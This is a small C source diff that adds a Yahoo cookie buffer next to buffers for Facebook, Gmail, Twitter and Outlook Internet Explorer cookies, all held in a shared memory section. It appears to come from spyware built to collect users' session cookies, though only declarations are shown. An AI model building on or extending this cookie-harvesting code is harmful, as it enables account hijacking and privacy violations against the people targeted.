@@ -101,6 +101,7 @@ char FACEBOOK_IE_COOKIE[1024];
 char GMAIL_IE_COOKIE[1024];
 char TWITTER_IE_COOKIE[1024];
 char OUTLOOK_IE_COOKIE[1024];
+char YAHOO_IE_COOKIE[1024];
 
 #pragma bss_seg()
 #pragma comment(linker, "/section:shared,RWS")
